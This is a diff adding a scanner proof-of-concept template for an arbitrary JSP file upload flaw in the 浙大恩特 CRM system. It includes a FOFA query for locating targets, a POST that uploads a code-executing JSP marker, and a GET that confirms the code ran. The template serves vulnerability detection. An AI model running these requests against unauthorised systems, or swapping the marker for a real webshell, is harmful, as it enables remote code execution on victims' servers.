@@ -1,0 +1,26 @@
+id: poc-yaml-zhedaente-entsoft-CrmBasicAction-upload
+info:
+  name: 浙大恩特客户资源管理系统 fileupload.jsp 任意文件上传
+  severity: critical
+  tags:
+  - 两高一弱
+  - 文件上传
+  finger: 浙大恩特客户资源管理系统
+  fofa: title="欢迎使用浙大恩特客户资源管理系统"
+variables:
+  filename: to_lower(random_str(10))
+  t1: random_int(100,1000)
+  t2: random_int(100,1000)
+  t3: t1 * t2
+requests:
+- method: POST
+  path: /entsoft_en/entereditor/jsp/fileupload.jsp?filename={{.filename}}.jsp
+  headers:
+    Content-Type: application/x-www-form-urlencoded
+  data: This website has a vulnerability!!!<% out.println({{.t1}}*{{.t2}}); %>
+  expression: status_code == 200
+- method: GET
+  path: /enterdoc/uploadfile/{{.filename}}.jsp
+  expression: status_code == 200 && contains(body,t3) && contains(body,"This website
+    has a vulnerability!!!")
+transport: http
